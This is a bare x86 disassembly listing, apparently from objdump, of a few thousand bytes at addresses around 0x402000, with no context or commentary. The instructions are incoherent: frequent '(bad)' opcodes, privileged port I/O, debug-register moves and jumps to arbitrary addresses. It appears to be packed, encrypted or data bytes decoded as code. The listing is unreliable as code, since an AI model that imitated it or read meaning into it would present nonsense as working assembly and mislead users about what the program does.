  401ff0:	mov    edi,0x742a0f06
  401ff5:	ins    BYTE PTR es:[edi],dx
  401ff6:	iret   
  401ff7:	mov    dh,0xb7
  401ff9:	fild   WORD PTR [ecx+0x61]
  401ffc:	jb     0x402001
  401ffe:	dec    ecx
  401fff:	and    BYTE PTR [esi+esi*2+0xb],cl
  402003:	pop    es
  402004:	adc    DWORD PTR [esi],ecx
  402006:	fstp   TBYTE PTR [edx-0x2f88fa41]
  40200c:	add    bl,0xa
  40200f:	push   edi
  402010:	leave  
  402011:	into   
  402012:	add    al,0x55
  402014:	aad    0x12
  402016:	pop    esi
  402017:	mov    edi,0x4c02755d
  40201c:	pop    ecx
  40201d:	xor    esi,esi
  40201f:	mov    DWORD PTR [edx],esi
  402021:	aad    0xfb
  402023:	ds cmp al,0x6c
  402026:	js     0x401fa9
  402028:	loope  0x402029
  40202a:	or     esi,ebx
  40202c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40202d:	in     eax,dx
  40202e:	inc    eax
  40202f:	mov    ebx,0x42cdd01c
  402034:	mov    bh,0x76
  402036:	in     al,0x82
  402038:	jl     0x402087
  40203a:	sti    
  40203b:	call   0x725a:0x8ecdff3d
  402042:	sub    DWORD PTR [ebp-0x7c3d767f],ecx
  402048:	loop   0x402069
  40204a:	lea    edx,[edx+edx*4]
  40204d:	fucomi st,st(4)
  40204f:	out    dx,eax
  402050:	fcomi  st,st(6)
  402052:	lods   al,BYTE PTR ds:[esi]
  402053:	push   ebx
  402054:	xchg   DWORD PTR ds:0xe862de2e,ebp
  40205a:	add    eax,0xf157974
  40205f:	je     0x40206d
  402061:	pop    ss
  402062:	out    0xcd,eax
  402064:	jge    0x402058
  402066:	mov    ebp,0x6174042e
  40206b:	xlat   BYTE PTR ds:[ebx]
  40206c:	adc    BYTE PTR [ebx+0x53],al
  40206f:	das    
  402070:	jae    0x4020d6
  402072:	(bad)  
  402073:	(bad)  
  402075:	push   ebx
  402076:	jge    0x4020c0
  402078:	jge    0x4020c0
  40207a:	inc    esp
  40207b:	stc    
  40207c:	add    esi,edx
  40207e:	pop    esp
  40207f:	leave  
  402080:	xor    al,0xf9
  402082:	sbb    al,0xf9
  402084:	fisubr DWORD PTR [ebp+0xeebfee0]
  40208a:	fstp   st(0)
  40208c:	fld    TBYTE PTR [ebx+0x944347d]
  402092:	fldz   
  402094:	(bad)  
  402095:	fs add eax,0x800c004e
  40209b:	xor    eax,0x3c839009
  4020a0:	enter  0xa03f,0x2
  4020a4:	inc    eax
  4020a5:	enter  0xf205,0x20
  4020a9:	pslld  mm7,mm2
  4020ac:	or     BYTE PTR [eax-0x64],al
  4020af:	or     al,0x50
  4020b1:	ret    
  4020b2:	paddb  mm4,mm4
  4020b5:	daa    
  4020b6:	mov    esp,tr6
  4020b9:	adc    al,BYTE PTR [eax+0x20169896]
  4020bf:	mov    esp,0xf23f19be
  4020c4:	xchg   ebx,eax
  4020c5:	lahf   
  4020c6:	sub    BYTE PTR [ebx-0x12],ch
  4020c9:	sbb    al,0xf9
  4020cb:	add    dl,BYTE PTR [ebp+0x43b74020]
  4020d1:	mov    edx,0x85cbb723
  4020d6:	xor    ah,BYTE PTR [edi]
  4020d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d9:	aam    0x5e
  4020db:	sub    eax,0x9fe72a13
  4020e0:	(bad)  
  4020e1:	std    
  4020e2:	out    0x84,eax
  4020e4:	xchg   ecx,eax
  4020e5:	sub    al,BYTE PTR [eax-0x4a19df0c]
  4020eb:	sub    eax,0xa931a009
  4020f0:	pop    edi
  4020f1:	jecxz  0x402123
  4020f3:	add    al,0xbf
  4020f5:	out    0x6f,al
  4020f7:	(bad)  
  4020f8:	repz leave 
  4020fa:	sbb    ecx,DWORD PTR [esi-0x43d13acc]
  402100:	mov    ds:0x764037b1,al
  402105:	cmp    ch,BYTE PTR [ebx+0xb]
  402108:	fidivr WORD PTR [edx]
  40210a:	jmp    ebp
  40210c:	outs   dx,DWORD PTR ds:[esi]
  40210d:	(bad)  
  40210e:	call   0xc763259c
  402113:	mov    bh,BYTE PTR [esi]
  402115:	bound  ebp,QWORD PTR [ebp+eax*8+0x41ad78eb]
  40211c:	cmp    BYTE PTR [edx+0x17],0xb7
  402120:	xlat   BYTE PTR es:[ebx]
  402122:	fadd   DWORD PTR [ebx+ecx*8+0x7f]
  402126:	stc    
  402127:	das    
  402128:	nop
  402129:	lods   al,BYTE PTR ds:[esi]
  40212a:	outs   dx,BYTE PTR ds:[esi]
  40212b:	xor    bh,BYTE PTR [eax-0x7a]
  40212e:	xchg   DWORD PTR [eax-0x4c],ecx
  402131:	push   edi
  402132:	or     bh,BYTE PTR [edi]
  402134:	push   ss
  402135:	push   0xffa14ba9
  40213a:	inc    DWORD PTR [esi]
  40213c:	(bad)  
  40213d:	in     eax,dx
  40213e:	int3   
  40213f:	into   
  402140:	sbb    eax,edx
  402142:	ror    DWORD PTR [esi+0x40],cl
  402145:	fst    QWORD PTR [eax+eax*2]
  402148:	popa   
  402149:	push   ecx
  40214a:	pop    ecx
  40214b:	test   BYTE PTR [edx+0x40],dl
  40214e:	enter  0x19a5,0x90
  402152:	mov    ecx,0xffff6fa5
  402157:	(bad)  
  402158:	jmp    DWORD PTR [ebp+0xf3a4055]
  40215e:	and    ah,dh
  402160:	daa    
  402161:	(bad)  
  402162:	retf   
  402163:	into   
  402164:	pop    eax
  402165:	inc    eax
  402166:	test   BYTE PTR [ecx],cl
  402168:	xchg   esp,eax
  402169:	clc    
  40216a:	js     0x4021a5
  40216c:	aas    
  40216d:	sbb    DWORD PTR [eax+eax*2-0x1b],0xd736b90b
  402175:	pop    es
  402176:	(bad)  
  402177:	mov    eax,ds:0xffffff5f
  40217c:	inc    DWORD PTR [eax-0x21]
  40217f:	dec    esi
  402180:	addr16 add al,0xcd
  402183:	leave  
  402184:	repnz leave 
  402186:	bound  eax,QWORD PTR [eax-0x6a]
  402189:	and    al,BYTE PTR [ecx+0x6f7c4045]
  40218f:	cld    
  402190:	gs inc eax
  402192:	sahf   
  402193:	mov    ch,0x70
  402195:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  40219b:	inc    eax
  40219c:	aad    0xff
  40219e:	das    
  40219f:	mov    cl,0xfd
  4021a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021a2:	iret   
  4021a3:	dec    DWORD PTR [ecx+0x1f]
  4021a6:	js     0x402202
  4021a8:	inc    eax
  4021a9:	call   0xab56e749
  4021ae:	mov    bl,0xef
  4021b0:	cmp    eax,0xe98ce041
  4021b5:	(bad)  
  4021b6:	(bad)  
  4021b7:	(bad)  
  4021b8:	inc    DWORD PTR [eax-0x6c45b837]
  4021be:	test   al,0x41
  4021c0:	stos   BYTE PTR es:[edi],al
  4021c1:	pop    ss
  4021c2:	out    0x7f,al
  4021c4:	sub    esp,DWORD PTR [ecx+0x4212b616]
  4021ca:	imul   edx,DWORD PTR [ebp+0x27],0x39
  4021ce:	(bad)  
  4021cf:	div    DWORD PTR [eax-0x20]
  4021d2:	jl     0x402216
  4021d4:	xor    cl,cl
  4021d6:	cmp    al,0xe3
  4021d8:	(bad)  
  4021d9:	(bad)  
  4021da:	jmp    FWORD PTR [edi]
  4021dc:	cld    
  4021dd:	xchg   esi,eax
  4021de:	push   edx
  4021df:	mov    ah,bh
  4021e1:	inc    edx
  4021e2:	mov    fs,WORD PTR [ebp+ebx*4-0x55811405]
  4021e9:	push   ecx
  4021ea:	inc    ebx
  4021eb:	mov    WORD PTR [edi],gs
  4021ed:	push   0x5c
  4021ef:	sbb    esp,edi
  4021f1:	sar    BYTE PTR es:[ebx-0x1c89bd],cl
  4021f8:	(bad)  
  4021f9:	(bad)  
  4021fa:	dec    esp
  4021fc:	repnz sub DWORD PTR [edi],ebp
  4021ff:	test   BYTE PTR [ecx+0xad24426],al
  402205:	nop
  402206:	fild   DWORD PTR [eax]
  402208:	daa    
  402209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40220a:	lahf   
  40220b:	nop
  40220c:	inc    esp
  40220d:	pop    ss
  40220e:	stos   BYTE PTR es:[edi],al
  40220f:	clc    
  402210:	scas   al,BYTE PTR es:[edi]
  402211:	adc    bl,ah
  402213:	(bad)
  402216:	inc    esp
  402217:	pop    ecx
  402218:	pushf  
  402219:	mov    al,0xe9
  40221b:	(bad)  
  40221c:	(bad)  
  40221d:	(bad)  
  40221e:	inc    DWORD PTR [edi]
  402220:	pushf  
  402221:	mov    dh,dl
  402223:	fs inc ebp
  402225:	aam    0xf3
  402227:	imul   ebx
  402229:	loope  0x402275
  40222b:	jp     0x4021c2
  40222d:	iret   
  40222e:	inc    ebp
  40222f:	bound  esp,QWORD PTR [edx-0x2723f86b]
  402235:	ds mov eax,0x91c74639
  40223b:	push   cs
  40223c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40223d:	scas   al,BYTE PTR es:[edi]
  40223e:	mov    al,ds:0xffffff42
  402243:	sbb    ebx,esp
  402245:	mov    ds:0x750c1746,eax
  40224a:	add    DWORD PTR [esi+0x48c97675],0x93a7e44d
  402254:	cmp    DWORD PTR [ebx],edi
  402256:	xor    eax,0x53edb2b8
  40225b:	mov    ds:0xf16ffff5,eax
  402260:	cmp    eax,0x9e015dc5
  402265:	xchg   edx,eax
  402266:	pop    edx
  402267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402268:	lock mov eax,ds:0xa554c020
  40226e:	mov    WORD PTR [edi],?
  402270:	popa   
  402271:	mov    ebx,DWORD PTR [edx-0x1]
  402274:	(bad)  
  402275:	(bad)  
  402276:	mov    edi,0x895d2522
  40227b:	stc    
  40227c:	(bad)  [edi-0x8]
  40227f:	repz daa 
  402281:	mov    edi,0xdd5dc8a2
  402286:	sub    BYTE PTR [esi-0x65],0x97
  40228a:	and    BYTE PTR [edx-0x3b9fadfe],cl
  402290:	and    eax,0xd559f075
  402295:	and    al,BYTE PTR [eax]
  402297:	mov    bh,0xfe
  402299:	outs   dx,BYTE PTR ds:[esi]
  40229a:	bound  edx,QWORD PTR [ecx]
  40229c:	xor    eax,0x1e7bcaae
  4022a1:	and    eax,0xe8dfcb8c
  4022a6:	add    esi,DWORD PTR [ebp-0x4be08b85]
  4022ac:	xchg   BYTE PTR [edi],al
  4022ae:	jne    0x4022cc
  4022b0:	push   0xffffffa0
  4022b2:	jmp    0x402297
  4022b4:	mov    cl,0x1
  4022b6:	or     esp,DWORD PTR ds:0xdf9ff00
  4022bc:	fadd   QWORD PTR [edi]
  4022be:	push   ss
  4022bf:	xchg   BYTE PTR [eax],ch
  4022c1:	cmp    eax,0xf4c3ef8
  4022c6:	pop    eax
  4022c7:	loop   0x40228d
  4022c9:	pop    ds
  4022ca:	hlt    
  4022cb:	movzx  eax,WORD PTR ds:0x8d8a4020
  4022d2:	shl    DWORD PTR [eax+0x6b],1
  4022d5:	lods   eax,DWORD PTR ds:[esi]
  4022d6:	jns    0x40230c
  4022d8:	inc    edx
  4022d9:	push   0xa068e488
  4022de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022df:	mov    ebx,DWORD PTR [eax*8-0x33b2bb3f]
  4022e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022e7:	sub    BYTE PTR [ebx+esi*1+0x61],0x30
  4022ec:	clc    
  4022ed:	hlt    
  4022ee:	add    al,0x30
  4022f0:	int    0xb2
  4022f2:	(bad)  [edi]
  4022f4:	hlt    
  4022f5:	push   eax
  4022f6:	xor    edi,eax
  4022f8:	add    BYTE PTR [esp+ebp*2-0x4553e76e],ah
  4022ff:	dec    esp
  402300:	shr    DWORD PTR [eax+0x15],1
  402303:	cmc    
  402304:	push   ds
  402305:	and    al,0x6
  402307:	cmp    al,0xc7
  402309:	out    dx,eax
  40230a:	mov    ax,ds:0x5d4bfb70
  402310:	mov    esp,0x66ffc0eb
  402315:	adc    ah,BYTE PTR [esi+0x2d]
  402318:	aas    
  402319:	or     ax,dx
  40231c:	mov    ds:0xc97fff14,ax
  402322:	shr    DWORD PTR [ecx+ecx*1+0x54464f53],1
  402329:	push   edi
  40232a:	inc    ecx
  40232b:	push   edx
  40232c:	inc    ebp
  40232d:	pop    esp
  40232e:	inc    edx
  40232f:	outs   dx,DWORD PTR ds:[esi]
  402330:	jb     0x40239e
  402332:	popa   
  402333:	iret   
  402334:	(bad)  
  402335:	(bad)  
  402336:	jmp    FWORD PTR [esi+0x64]
  402339:	pop    esp
  40233a:	inc    esp
  40233b:	gs ins BYTE PTR es:[edi],dx
  40233d:	jo     0x4023a7
  40233f:	imul   ebx,DWORD PTR [edx+edx*2+0x54],0x5046004c
  402347:	push   ebp
  402348:	dec    ebp
  402349:	popa   
  40234a:	jae    0x4023b7
  40234c:	push   esi
  40234d:	popa   
  40234e:	ins    BYTE PTR es:[edi],dx
  40234f:	jne    0x4023b6
  402351:	fild   DWORD PTR [ebp-0x1c0859a4]
  402357:	fldcw  WORD PTR ds:0x2807eb39
  40235e:	mov    DWORD PTR [ecx],ecx
  402360:	mov    esp,0xb5d470c1
  402365:	mov    cl,BYTE PTR [esi]
  402367:	inc    ecx
  402368:	cmc    
  402369:	add    ebp,esp
  40236b:	mov    db2,eax
  40236e:	test   BYTE PTR [ecx],ah
  402370:	sbb    BYTE PTR [eax],bl
  402372:	test   al,0x8b
  402374:	ror    BYTE PTR ds:0xe0764d8e,1
  40237a:	and    al,0x2b
  40237c:	sbb    edi,DWORD PTR [esi+eax*1+0x18]
  402380:	fdivr  DWORD PTR [ebp+0x6321ad7b]
  402386:	rcl    BYTE PTR [ebx],0x4b
  402389:	mov    db7,esp
  40238c:	test   dl,dl
  40238e:	popa   
  40238f:	add    ebp,ebp
  402391:	dec    eax
  402392:	repz and esp,DWORD PTR [edi+edx*1+0x36b20731]
  40239a:	shl    BYTE PTR [edi-0xf781f9],0x51
  4023a1:	cld    
  4023a2:	ret    
  4023a3:	inc    ebx
  4023a4:	ret    
  4023a5:	push   0xffffffab
  4023a7:	mov    ecx,DWORD PTR [ebx-0x28]
  4023aa:	add    DWORD PTR ds:0x5144b836,0x61490fc1
  4023b4:	pop    ecx
  4023b5:	pusha  
  4023b6:	mov    edx,0x8116ed8
  4023bb:	mov    edx,esp
  4023bd:	adc    eax,0x5f014ab8
  4023c2:	enter  0x2dc1,0x9f
  4023c6:	pop    ebx
  4023c7:	fadd   QWORD PTR [edx]
  4023c9:	or     bl,BYTE PTR [ebx]
  4023cb:	jmp    0x4023ba
  4023cd:	cmp    DWORD PTR [eax-0x2b15a56b],edi
  4023d3:	je     0x4023f2
  4023d5:	xchg   DWORD PTR [ebx],ecx
  4023d7:	jp     0x4023e6
  4023d9:	jae    0x4023eb
  4023db:	mov    ch,0x7b
  4023dd:	sti    
  4023de:	sbb    eax,edi
  4023e0:	push   es
  4023e1:	mov    edi,DWORD PTR [ebx+0x14]
  4023e4:	mov    DWORD PTR [edi+eax*1],esi
  4023e7:	nop    DWORD PTR [ecx+0x75]
  4023eb:	sbb    al,0x75
  4023ed:	jecxz  0x4023ee
  4023ef:	adc    ch,BYTE PTR [esi]
  4023f1:	or     BYTE PTR [ebx+0x56],bl
  4023f4:	mov    eax,ds:0xc0568b36
  4023f9:	mov    esi,DWORD PTR [esi-0x24]
  4023fc:	pop    es
  4023fd:	outs   dx,DWORD PTR ds:[esi]
  4023fe:	sub    BYTE PTR [edi],dl
  402400:	pop    ecx
  402401:	mov    esp,0xd8899c33
  402406:	add    eax,0x5deeec7d
  40240b:	jmp    0x8211ab31
  402410:	stc    
  402411:	repnz push DWORD PTR [ebx+0x11]
  402415:	pop    es
  402416:	(bad)  
  402417:	jb     0x402420
  402419:	shrd   DWORD PTR [edx-0x43],esi,cl
  40241d:	sub    eax,0x21920387
  402422:	jmp    ecx
  402424:	cld    
  402425:	ror    BYTE PTR [eax],1
  402427:	mov    ebp,0xc101edcb
  40242c:	mov    edi,ebx
  40242e:	adc    ecx,ebp
  402430:	aas    
  402431:	xchg   esp,eax
  402432:	sti    
  402433:	out    dx,eax
  402434:	mov    eax,ds:0x5771a01a
  402439:	pop    ss
  40243a:	jge    0x402415
  40243c:	mov    cl,0x2e
  40243e:	sbb    dh,dl
  402440:	popa   
  402441:	lock enter 0x325e,0x0
  402446:	push   es
  402447:	in     eax,dx
  402448:	add    al,BYTE PTR [edi+0x5c]
  40244b:	adc    esp,DWORD PTR [edx]
  40244d:	ins    BYTE PTR es:[edi],dx
  40244e:	mov    esp,DWORD PTR ds:0x380cdba0
  402454:	inc    eax
  402455:	adc    al,0xf1
  402457:	adc    al,0xda
  402459:	inc    esp
  40245a:	fld    TBYTE PTR [edx+0x1389d6ee]
  402460:	mov    DWORD PTR [esi*8+0x638798b],esp
  402467:	mov    edi,0x8d1ae26f
  40246c:	dec    ebp
  40246d:	clc    
  40246e:	and    BYTE PTR [eax+0x18],dl
  402471:	mov    WORD PTR [ecx],fs
  402473:	pushf  
  402474:	mov    ebx,0xc260ee51
  402479:	ds jae 0x4024cc
  40247c:	setne  BYTE PTR [edx+0x6126e1cf]
  402483:	fdivr  st,st(5)
  402485:	gs push 0xc9b31c20
  40248b:	pop    es
  40248c:	mov    eax,ds:0x8bf0c47c
  402491:	ret    
  402492:	pop    edi
  402493:	out    dx,eax
  402494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402495:	or     bl,ch
  402497:	adc    al,BYTE PTR [eax]
  402499:	mov    eax,0xde582968
  40249e:	in     eax,dx
  40249f:	sbb    esi,DWORD PTR [ebp-0xb]
  4024a2:	mov    esi,DWORD PTR [edx]
  4024a4:	cmp    esi,DWORD PTR [eax]
  4024a6:	sbb    dh,BYTE PTR [edx+0x34]
  4024a9:	jo     0x4024af
  4024ab:	jne    0x4024bd
  4024ad:	pop    es
  4024ae:	jbe    0x402453
  4024b0:	xchg   esi,eax
  4024b1:	xchg   edi,eax
  4024b2:	or     BYTE PTR [eax],cl
  4024b4:	jne    0x4024be
  4024b6:	or     al,0xf5
  4024b8:	je     0x4024cd
  4024ba:	and    BYTE PTR [eax-0x48],dl
  4024bd:	test   BYTE PTR [esi-0x3aaa23d3],al
  4024c3:	jnp    0x4024fa
  4024c5:	aam    0x4d
  4024c7:	enter  0x5b13,0x12
  4024cb:	or     eax,0xce40353
  4024d0:	cdq    
  4024d1:	sbb    eax,0xfc0423cc
  4024d6:	sbb    esp,DWORD PTR [ecx-0x5dd7cc30]
  4024dc:	pop    ds
  4024dd:	push   edi
  4024de:	xchg   esi,eax
  4024df:	in     eax,0x55
  4024e1:	mov    DWORD PTR [ebx],ebx
  4024e3:	pop    ebx
  4024e4:	mov    cl,0x7e
  4024e6:	rol    BYTE PTR [eax+0x510fee0d],1
  4024ec:	cmc    
  4024ed:	or     eax,0x27c4b0f
  4024f2:	repnz scas ax,WORD PTR es:[edi]
  4024f5:	cmp    eax,0x7ef66659
  4024fa:	ret    
  4024fb:	jae    0x40252a
  4024fd:	jle    0x402482
  4024ff:	pop    eax
  402500:	mov    dh,0x29
  402502:	enter  0x748b,0x47
  402506:	or     dl,BYTE PTR [edi-0x47147dd3]
  40250c:	mov    ebp,0x74d03900
  402511:	jns    0x402553
  402513:	fdiv   st(3),st
  402515:	repz inc edi
  402517:	call   FWORD PTR [esi]
  402519:	neg    BYTE PTR [ebx+eax*8-0x48]
  40251d:	pop    esi
  40251e:	sbb    BYTE PTR [ebx],0x4f
  402521:	add    edx,DWORD PTR [esi+0x66]
  402524:	fadd   DWORD PTR [eax]
  402526:	fdiv   QWORD PTR cs:[ecx+0x17ce0966]
  40252d:	data16 (bad) 
  40252f:	shl    BYTE PTR [esi],0xf5
  402532:	rcl    DWORD PTR [eax-0x27],0x21
  402536:	dec    eax
  402537:	aam    0x58
  402539:	adc    al,0xf1
  40253b:	pop    esi
  40253c:	push   ss
  40253d:	push   0x3b
  40253f:	push   ss
  402540:	xchg   esp,eax
  402541:	pop    esi
  402542:	cs popa 
  402544:	lock cmp esp,DWORD PTR [esi+0xbd43753]
  40254b:	aaa    
  40254c:	dec    ecx
  40254d:	jl     0x402552
  40254f:	cmp    eax,0xa8d231f4
  402554:	mov    ebx,DWORD PTR fs:[edx]
  402557:	mov    al,ds:0x89a37fa6
  40255c:	pop    eax
  40255d:	imul   ecx,DWORD PTR [eax],0x810441c7
  402563:	xor    edi,DWORD PTR [ecx+0x41]
  402566:	dec    ebp
  402567:	jge    0x4025c1
  402569:	pop    eax
  40256a:	jp     0x402576
  40256c:	adc    ebx,DWORD PTR [edx+0x22]
  40256f:	and    al,0xbc
  402571:	jmp    0x6f55:0xa1a5e32c
  402578:	adc    eax,0x5081b20e
  40257d:	jno    0x402595
  40257f:	sbb    eax,0x8458a310
  402584:	jae    0x4025ce
  402586:	inc    edi
  402587:	inc    esi
  402588:	fbstp  TBYTE PTR [eax]
  40258a:	ds adc bh,bh
  40258d:	push   edx
  40258e:	clc    
  40258f:	mov    edi,0xd1c1e40c
  402594:	out    0xe8,eax
  402596:	shl    BYTE PTR ss:[edi+edi*2+0x1],0x14
  40259c:	adc    eax,ebp
  40259e:	je     0x402573
  4025a0:	push   edx
  4025a1:	lods   eax,DWORD PTR ds:[esi]
  4025a2:	or     esi,DWORD PTR [edi+0x4a]
  4025a5:	and    al,0x18
  4025a7:	add    DWORD PTR [esi+0x11],esi
  4025aa:	xor    ebx,DWORD PTR [ebx-0x44]
  4025ad:	jmp    0xfb1fc852
  4025b2:	in     eax,dx
  4025b3:	push   cs
  4025b4:	ficom  WORD PTR [ebx+ebx*1]
  4025b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025b8:	jnp    0x402595
  4025ba:	push   cs
  4025bb:	add    BYTE PTR [ebx+0x6a543050],bh
  4025c1:	add    bl,BYTE PTR ds:0xbbdb34e4
  4025c7:	xchg   ecx,eax
  4025c8:	xor    al,0x8
  4025ca:	pop    eax
  4025cb:	addr16 pop ss
  4025cd:	add    eax,esp
  4025cf:	sti    
  4025d0:	mov    al,0xc8
  4025d2:	add    BYTE PTR [edi+edx*2],0x7
  4025d6:	push   eax
  4025d7:	push   ebx
  4025d8:	mov    cl,0x1a
  4025da:	cld    
  4025db:	sbb    eax,0xf2130cef
  4025e0:	sbb    DWORD PTR [ebx+0x39800141],ecx
  4025e6:	jmp    0xa3b454e4
  4025eb:	fild   WORD PTR [ebx+ebp*8]
  4025ee:	jne    0x4025fc
  4025f0:	movsx  edx,BYTE PTR ds:0xc160eb41
  4025f7:	add    eax,0x35cc3a33
  4025fc:	xchg   ebp,eax
  4025fd:	fwait
  4025fe:	xor    ebx,DWORD PTR ds:0xe491acb4
  402604:	in     al,dx
  402605:	and    al,0x38
  402607:	push   ecx
  402608:	pop    ebp
  402609:	loope  0x40261e
  40260b:	mov    bl,0xdc
  40260d:	and    al,0x67
  40260f:	movlps xmm2,QWORD PTR [edx+0x1f]
  402613:	loop   0x40266f
  402615:	(bad)  
  402617:	mov    dl,0xb3
  402619:	ret    
  40261a:	sbb    eax,0x1ce3b210
  40261f:	pop    eax
  402620:	arpl   WORD PTR [ecx+0x2400dd1c],bp
  402626:	test   DWORD PTR [eax+0x4],0xe1fedd5a
  40262d:	out    dx,al
  40262e:	push   0x38814413
  402633:	fisub  WORD PTR [ecx]
  402635:	stos   BYTE PTR es:[edi],al
  402636:	dec    eax
  402637:	adc    al,0x74
  402639:	outs   dx,BYTE PTR ds:[esi]
  40263a:	mov    ds:0xb409bee1,al
  40263f:	and    BYTE PTR [eax+0x2f10158b],dh
  402645:	ror    ah,cl
  402647:	push   esi
  402648:	js     0x402624
  40264a:	adc    ecx,esi
  40264c:	dec    ebx
  40264d:	shl    BYTE PTR [edi+0x9],cl
  402650:	out    0xf8,eax
  402652:	outs   dx,DWORD PTR ds:[esi]
  402653:	aad    0xa9
  402655:	cmp    eax,0xce3981f8
  40265a:	cli    
  40265b:	out    dx,eax
  40265c:	push   cs
  40265d:	je     0x402696
  40265f:	xor    eax,0x59
  402662:	js     0x4026d6
  402664:	call   0x29b64e8e
  402669:	cs ja  0x402641
  40266c:	clc    
  40266d:	sbb    al,BYTE PTR [eax-0x3eafe4e0]
  402673:	add    dh,ch
  402675:	mul    BYTE PTR [edx-0x4f]
  402678:	ins    DWORD PTR es:[edi],dx
  402679:	rcr    DWORD PTR [eax+0x3b],cl
  40267c:	stos   DWORD PTR es:[edi],eax
  40267d:	dec    esp
  40267e:	jp     0x4026e4
  402680:	jl     0x402618
  402682:	lods   al,BYTE PTR ds:[esi]
  402683:	lds    ecx,FWORD PTR [edi*4+0x76013a0a]
  40268a:	push   ds
  40268b:	mov    al,0xad
  40268d:	mov    ds:0xfe501587,eax
  402692:	or     ch,bh
  402694:	push   eax
  402695:	cmp    al,0x70
  402697:	mov    cl,0xd1
  402699:	fucomp st(7)
  40269b:	je     0x40270d
  40269d:	sbb    DWORD PTR [ecx+0x2],0xffffffa3
  4026a1:	jbe    0x402629
  4026a3:	sbb    esp,DWORD PTR ds:0x531b159d
  4026a9:	sbb    al,0x87
  4026ab:	sub    BYTE PTR [edx-0x36],ch
  4026ae:	ins    BYTE PTR es:[edi],dx
  4026af:	(bad)  [esi+0x3435983a]
  4026b5:	push   edx
  4026b6:	fcomp  QWORD PTR [eax]
  4026b8:	mov    edi,0xb36a31ef
  4026bd:	sub    bl,dh
  4026bf:	push   DWORD PTR [eax+0x5a06d00]
  4026c5:	mov    ebp,DWORD PTR [edi-0x51]
  4026c8:	xchg   esi,eax
  4026c9:	sti    
  4026ca:	sbb    ebx,DWORD PTR [edi+0x47c7045f]
  4026d0:	add    al,0xc4
  4026d2:	sub    BYTE PTR [ecx-0x59],cl
  4026d5:	mov    cl,0x93
  4026d7:	mov    dh,ah
  4026d9:	and    al,0x24
  4026db:	jmp    ebx
  4026dd:	sub    ecx,DWORD PTR gs:[eax+0x67ddd426]
  4026e4:	test   eax,0x41002611
  4026e9:	or     BYTE PTR [edx],bl
  4026eb:	and    DWORD PTR [eax],ebx
  4026ed:	mov    eax,0xe1040704
  4026f2:	fldcw  WORD PTR [ebx]
  4026f4:	mov    bh,0x2f
  4026f6:	les    ecx,FWORD PTR [edx+0x1f741f6f]
  4026fc:	mov    ecx,DWORD PTR [edx+0x4c]
  4026ff:	inc    edx
  402700:	add    al,0x1c
  402702:	test   BYTE PTR ss:[ecx],0x7f
  402706:	xchg   BYTE PTR [esi],al
  402708:	into   
  402709:	mov    ecx,0xd1ff5853
  40270e:	ss jb  0x402746
  402711:	int3   
  402712:	cmp    eax,0xd874fb37
  402717:	lock icebp 
  402719:	lahf   
  40271a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40271b:	sbb    al,0xe8
  40271d:	pop    edx
  40271e:	push   esp
  40271f:	push   ebp
  402720:	push   edi
  402721:	push   esi
  402722:	push   ebx
  402723:	inc    ecx
  402724:	pop    es
  402725:	bound  ebp,QWORD PTR [edi+eax*4+0x42]
  402729:	mov    ebx,0x6025b26c
  40272e:	xor    esi,DWORD PTR [bx+0x5fed]
  402733:	xor    bh,al
  402735:	pop    ebx
  402736:	xchg   edi,eax
  402737:	dec    edi
  402738:	lea    eax,[ebp-0x3d964f6]
  40273e:	mov    bl,0x89
  402740:	xchg   ebp,eax
  402741:	inc    edx
  402742:	or     al,0x83
  402744:	pusha  
  402745:	add    al,0xfd
  402747:	lahf   
  402748:	mov    edx,0x28d80842
  40274d:	cmp    eax,0x739ce8bc
  402752:	int3   
  402753:	(bad)  
  402754:	addr16 adc al,0xec
  402757:	xor    al,BYTE PTR [edi+0x5d]
  40275a:	or     al,0x10
  40275c:	pop    ecx
  40275d:	add    al,0x7a
  40275f:	lea    ecx,[eax-0x52]
  402762:	repnz and DWORD PTR [bx+di],edi
  402766:	pop    edx
  402767:	mov    esp,DWORD PTR [esp+0x2c]
  40276b:	jne    0x4026ef
  40276d:	pop    ss
  40276e:	jp     0x40278b
  402770:	mov    edx,0xe23db65d
  402775:	ret    
  402776:	xor    DWORD PTR [ebx-0x69421193],edi
  40277c:	jmp    0xc942414c
  402781:	ret    0xc30c
  402784:	fistp  DWORD PTR [ebx-0x35]
  402787:	rcl    BYTE PTR [edi],0xb4
  40278a:	pop    ss
  40278b:	add    bh,BYTE PTR ds:0x70c04092
  402791:	xor    edi,edi
  402793:	std    
  402794:	jg     0x4027c2
  402796:	je     0x4027f4
  402798:	cmp    eax,0x7415088e
  40279d:	push   edi
  40279e:	sub    eax,0x872d0f05
  4027a3:	std    
  4027a4:	jg     0x40278f
  4027a6:	call   DWORD PTR [edx]
  4027a8:	cmp    eax,0xeb4e7448
  4027ad:	pusha  
  4027ae:	add    eax,0x833ff971
  4027b3:	call   0x747699ba
  4027b8:	xor    bl,ch
  4027ba:	push   edx
  4027bb:	cmp    eax,0x3db6fd96
  4027c0:	jmp    FWORD PTR [ecx]
  4027c2:	adc    DWORD PTR [ebp+edi*1+0x2d],esi
  4027c6:	xchg   ebx,eax
  4027c7:	and    dl,BYTE PTR cs:[ebx]
  4027ca:	add    ah,BYTE PTR [ebx+ebp*8]
  4027cd:	cmp    ch,BYTE PTR ds:0xffe8dffd
  4027d3:	test   BYTE PTR [esi],0x2f
  4027d6:	daa    
  4027d7:	cmp    eax,0x2ceb2674
  4027dc:	mov    al,0xc8
  4027de:	jmp    0x40280a
  4027e0:	mov    al,0x28
  4027e2:	es mov al,0xcd
  4027e5:	jmp    0x402851
  4027e7:	test   eax,0xb022fbbf
  4027ec:	iret   
  4027ed:	jmp    0x40280d
  4027ef:	bndldx (bad),[eax-0x4fe91429]
  4027f6:	into   
  4027f7:	mov    ecx,0xea5d06b0
  4027fc:	fbstp  TBYTE PTR ds:0xebdab00e
